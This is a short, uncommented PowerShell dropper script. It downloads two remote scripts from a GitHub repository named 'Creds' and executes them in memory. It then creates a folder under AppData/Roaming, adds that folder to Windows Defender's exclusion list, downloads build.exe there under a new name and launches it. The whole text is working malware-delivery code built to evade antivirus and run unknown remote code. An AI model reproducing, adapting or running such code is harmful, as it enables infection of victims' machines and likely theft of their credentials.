iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/IgorAlaf/Creds/main/new-fail.ps1');
iex(new-object net.webclient).downloadstring("https://raw.githubusercontent.com/IgorAlaf/Creds/main/some-new-by.ps1");

New-Item -Path "$env:USERPROFILE/AppData/Roaming" -ItemType "directory" -Name "tempFolder"

Add-MpPreference -ExclusionPath "$env:USERPROFILE/AppData/Roaming/tempFolder"


Invoke-WebRequest "https://github.com/IgorAlaf/Creds/raw/main/build.exe" -Outfile "$env:USERPROFILE/AppData/Roaming/tempFolder/forme.exe";Start-Process $env:USERPROFILE/AppData/Roaming/tempFolder/forme.exe
